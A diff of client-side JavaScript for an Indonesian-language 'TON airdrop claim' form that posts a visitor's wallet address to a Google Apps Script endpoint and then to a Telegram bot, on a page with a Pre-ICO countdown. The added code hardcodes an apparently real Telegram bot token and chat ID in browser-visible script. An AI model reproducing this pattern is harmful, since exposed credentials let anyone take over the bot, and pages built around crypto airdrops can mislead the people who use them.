@@ -25,17 +25,31 @@ form?.addEventListener("submit", function (e) {
 const tonForm = document.getElementById("ton-form");
 tonForm?.addEventListener("submit", function (e) {
   e.preventDefault();
-  const wallet = document.getElementById("wallet").value;
-  const message = `🪂 Klaim Airdrop Baru:\nWallet TON: ${wallet}`;
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+  const wallet = document.getElementById("wallet").value.trim();
+  const botToken = "8053150769:AAG32Ys8JnTcsBfFHZm0bO5lXtmCzLsFy-Q";
+  const chatId = "-1002834298142";
+
+  fetch("https://script.google.com/macros/s/AKfycbwwj3ay9ifXYLfRTzd7kls0uA6JxTeNFjgBO6Pyh38fDFYsunYHDRoAnWPqoJ_Hsskg/exec", {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message }),
-  }).then(() => {
-    alert("Berhasil klaim! Token akan dikirim setelah validasi.");
-    tonForm.reset();
-  });
+    body: new URLSearchParams({ wallet })
+  })
+    .then(res => res.text())
+    .then((response) => {
+      alert(response);
+      if (response.includes("berhasil")) {
+        tonForm.reset();
+        // Kirim ke Telegram jika sukses klaim pertama kali
+        const message = `🪂 Klaim Airdrop Baru:\nWallet TON: ${wallet}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message }),
+        });
+      }
+    })
+    .catch(() => alert("❌ Gagal klaim. Silakan coba lagi."));
 });
+
 
 // === Hitung Mundur (Countdown ke akhir Pre-ICO) ===
 const countdown = () => {
